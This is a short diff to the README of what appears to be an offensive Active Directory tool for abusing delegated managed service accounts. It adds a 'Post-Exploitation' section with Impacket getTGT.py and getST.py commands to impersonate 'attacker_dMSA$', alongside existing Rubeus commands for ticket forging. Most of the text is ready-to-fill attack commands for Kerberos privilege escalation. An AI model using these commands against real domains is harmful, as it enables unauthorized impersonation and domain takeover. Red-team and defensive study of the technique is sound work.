@@ -112,7 +112,8 @@ The script automatically resolves this identity in Users, Computers, or domain o
 
 ---
 
-## Post-Exploitation with Rubeus
+## Post-Exploitation 
+## Rubeus
 Example commands generated for ticket forging:
 ```
 Rubeus.exe hash /password:'Password123!' /user:Pwn$ /domain:<domain>
@@ -121,6 +122,13 @@ Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/<domain> /dmsa /ops
 ```
 
 Fill placeholders like `<AES256KEY>` and `<BASE64TGT>` with actual values from previous steps.
+
+## Impacket
+Example commands generated for ticket forging:
+```
+getTGT.py '<domain>/Pwn$:Password123!'
+KRB5CCNAME=Pwn$.ccache getST.py '<domain>/Pwn$' -k -no-pass -dmsa -self -impersonate 'attacker_dMSA$'
+```
 
 ---
 
